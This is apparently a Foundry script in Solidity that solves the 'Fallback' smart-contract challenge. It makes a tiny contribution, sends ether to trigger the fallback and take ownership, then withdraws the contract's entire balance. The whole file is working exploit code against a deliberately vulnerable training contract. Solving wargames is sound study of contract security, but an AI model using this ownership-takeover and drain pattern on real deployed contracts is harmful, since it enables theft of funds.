// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "src/fallback/Fallback.sol";

contract FallbackScript is Script {
    function yoink(address eoa, Fallback target) public {
        vm.startBroadcast(eoa);
        target.contribute{value: 1 wei}();
        payable(address(target)).call{value: 1 wei}("");
        assert(target.owner() == eoa);
        target.withdraw();
        assert(address(target).balance == 0);
    }
}
